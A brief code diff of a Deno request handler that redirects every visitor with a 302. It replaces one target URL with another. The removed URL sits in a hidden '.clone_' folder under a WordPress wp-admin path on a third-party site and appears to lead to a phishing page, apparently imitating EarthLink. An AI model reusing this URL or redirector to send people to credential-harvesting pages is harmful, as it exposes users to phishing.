@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://amazontecsolucoes.com/wp-admin/network/.clone_ceOJ3Fr9/Earthl/_+_==/", // Replace this with your actual link
+      Location: "https://betterwebplace.com/", // Replace this with your actual link
     },
   });
 });
